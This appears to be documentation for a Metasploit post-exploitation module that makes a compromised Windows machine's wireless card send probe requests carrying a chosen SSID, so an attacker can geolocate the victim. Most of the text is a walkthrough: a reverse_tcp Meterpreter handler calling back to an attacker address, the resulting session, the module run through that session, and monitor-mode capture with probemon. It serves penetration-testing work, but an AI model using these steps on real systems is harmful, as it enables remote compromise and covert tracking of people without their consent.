## Description
The module send probe request packets through the wlan interfaces. The user can configure the message to be sent
(embedded in the SSID field) with a max length of 32 bytes and the time spent in seconds sending those packets
(considering a sleep of 10 seconds between each probe request).

The module borrows most of its code from the @thelightcosine wlan_* modules (everything revolves around the
wlanscan API and the DOT11_SSID structure).

## Scenarios

This post module uses the remote victim's wireless card to beacon a specific SSID, allowing an attacker to
geolocate him or her during an engagement.

## Verification steps:
### Run the module on a remote computer:
```
msf exploit(ms17_010_eternalblue) > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.135.111
lhost => 192.168.135.111
msf exploit(handler) > set lport 4567
lport => 4567
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.135.111:4567 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 192.168.135.157
[*] Meterpreter session 1 opened (192.168.135.111:4567 -> 192.168.135.157:50661) at 2018-04-20 13:20:34 -0500

meterpreter > sysinfo
Computer        : WIN10X64-1703
OS              : Windows 10 (Build 15063).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(handler) > use post/windows/wlan/wlan_probe_request 
msf post(wlan_probe_request) > set ssid "TEST"
ssid => TEST
msf post(wlan_probe_request) > set timeout 300
timeout => 300
msf post(wlan_probe_request) > set session 1
session => 1
msf post(wlan_probe_request) > run

[*] Wlan interfaces found: 1
[*] Sending probe requests for 300 seconds
^C[-] Post interrupted by the console user
[*] Post module execution completed
msf post(wlan_probe_request) > 
```



### On another computer, use probemon to listen for the SSID:
```
tmoose@ubuntu:~/rapid7$ ifconfig -a
.
.
.
wlx00c0ca6d1287 Link encap:Ethernet  HWaddr 00:00:00:00:00:00  
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

tmoose@ubuntu:~/rapid7$ sudo airmon-ng start wlx00c0ca6d1287


Found 6 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
963	NetworkManager
981	avahi-daemon
1002	avahi-daemon
1170	dhclient
1180	dhclient
1766	wpa_supplicant


Interface	Chipset		Driver

wlx000000000000		Realtek RTL8187L	rtl8187 - [phy0]
				(monitor mode enabled on mon0)

tmoose@ubuntu:~/rapid7$ cd ..

tmoose@ubuntu:~$ sudo python probemon.py -t unix -i mon0 -s -r -l | grep TEST
1524248955	74:ea:3a:8e:a1:6d	TEST	-59
1524248955	74:ea:3a:8e:a1:6d	TEST	-73
1524248955	74:ea:3a:8e:a1:6d	TEST	-63
1524248955	74:ea:3a:8e:a1:6d	TEST	-68
1524248956	74:ea:3a:8e:a1:6d	TEST	-74
1524248965	74:ea:3a:8e:a1:6d	TEST	-59
1524248965	74:ea:3a:8e:a1:6d	TEST	-60
1524248965	74:ea:3a:8e:a1:6d	TEST	-74
1524248965	74:ea:3a:8e:a1:6d	TEST	-73
1524248965	74:ea:3a:8e:a1:6d	TEST	-63
1524248965	74:ea:3a:8e:a1:6d	TEST	-63
1524248965	74:ea:3a:8e:a1:6d	TEST	-78

.
.
.

```
